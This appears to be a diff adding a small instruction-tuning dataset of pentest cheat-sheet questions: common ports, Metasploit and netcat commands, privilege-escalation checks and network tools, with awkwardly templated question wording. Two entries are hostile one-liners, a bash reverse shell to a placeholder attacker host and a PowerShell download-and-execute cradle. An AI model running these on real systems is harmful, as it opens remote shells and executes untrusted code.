@@ -1,0 +1,20 @@
+{"instruction": "What are the common web ports?", "input": "", "output": "80 (HTTP), 443 (HTTPS), 8080 (HTTP Proxy), 8443 (HTTPS Alt), 3000/5000/8000 (Dev servers)"}
+{"instruction": "What are the common database ports?", "input": "", "output": "3306 (MySQL), 5432 (PostgreSQL), 1433 (MSSQL), 1521 (Oracle), 27017 (MongoDB), 6379 (Redis)"}
+{"instruction": "What are the common Windows ports?", "input": "", "output": "135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985/5986 (WinRM)"}
+{"instruction": "What are the common Linux service ports?", "input": "", "output": "22 (SSH), 21 (FTP), 23 (Telnet), 25 (SMTP), 53 (DNS), 111 (RPC)"}
+{"instruction": "What are the Metasploit basic commands?", "input": "", "output": "msfconsole, search, use, show options, set, exploit/run, sessions, background"}
+{"instruction": "What are the Netcat listener?", "input": "", "output": "nc -lvnp PORT (Linux) or nc.exe -lvnp PORT (Windows)"}
+{"instruction": "What are the Python simple server?", "input": "", "output": "python3 -m http.server PORT serves current directory"}
+{"instruction": "What are the Bash reverse shell?", "input": "", "output": "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"}
+{"instruction": "What are the PowerShell download?", "input": "", "output": "IEX(New-Object Net.WebClient).DownloadString('http://URL/script.ps1')"}
+{"instruction": "What are the curl POST request?", "input": "", "output": "curl -X POST -d 'data=value' URL"}
+{"instruction": "What are the wget download?", "input": "", "output": "wget URL -O output_filename"}
+{"instruction": "What are the base64 encode/decode?", "input": "", "output": "echo 'text' | base64 (encode) | base64 -d (decode)"}
+{"instruction": "What are the find SUID binaries?", "input": "", "output": "find / -perm -4000 -type f 2>/dev/null"}
+{"instruction": "What are the check sudo permissions?", "input": "", "output": "sudo -l shows what you can run as sudo"}
+{"instruction": "What are the Windows whoami?", "input": "", "output": "whoami /all shows user, groups, and privileges"}
+{"instruction": "What are the Linux capabilities?", "input": "", "output": "getcap -r / 2>/dev/null finds binaries with capabilities"}
+{"instruction": "What are the check listening ports Linux?", "input": "", "output": "ss -tlnp or netstat -tlnp"}
+{"instruction": "What are the check listening ports Windows?", "input": "", "output": "netstat -ano"}
+{"instruction": "What are the DNS lookup?", "input": "", "output": "dig domain.com or nslookup domain.com"}
+{"instruction": "What are the SSL certificate info?", "input": "", "output": "openssl s_client -connect host:443 | openssl x509 -text"}
